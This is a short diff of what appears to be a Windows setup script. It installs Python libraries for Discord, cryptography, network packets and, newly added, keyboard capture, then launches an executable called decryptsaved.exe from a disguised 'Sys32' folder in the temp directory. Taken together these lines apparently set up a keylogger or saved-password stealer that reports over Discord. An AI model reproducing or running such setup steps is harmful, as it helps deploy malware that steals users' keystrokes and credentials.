@@ -50,10 +50,7 @@ pip install discord.py
 pip install pycryptodome
 pip install requests
 pip install scapy
-pip3.13 install discord.py
-pip3.13 install pycryptodome
-pip3.13 install requests
-pip3.13 install scapy
+pip install keyboard
 pip show pycryptodome
 
 start %temp%\Sys32\decryptsaved.exe
